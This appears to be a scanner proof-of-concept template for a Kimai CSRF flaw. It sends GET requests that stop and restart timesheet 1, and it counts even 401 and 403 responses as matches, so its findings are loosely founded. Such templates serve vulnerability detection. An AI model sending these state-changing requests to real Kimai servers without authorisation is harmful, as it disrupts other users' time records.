[info]
author = "ave"
description = "Kimai timesheet stop/restart API endpoints CSRF vulnerability - GET requests can stop/restart timesheets without user consent"
id = "POC-AVE-2026-0383"
name = "CVE-2026-52823 PoC"
severity = "medium"
tags = ["ave-2026-0383"]
vuln_id = [
    "CVE-2026-52823",
    "AVE-2026-0383",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/api/timesheets/1/stop"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    204,
    401,
    403,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/api/timesheets/1/restart"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    204,
    401,
    403,
]
type = "status"
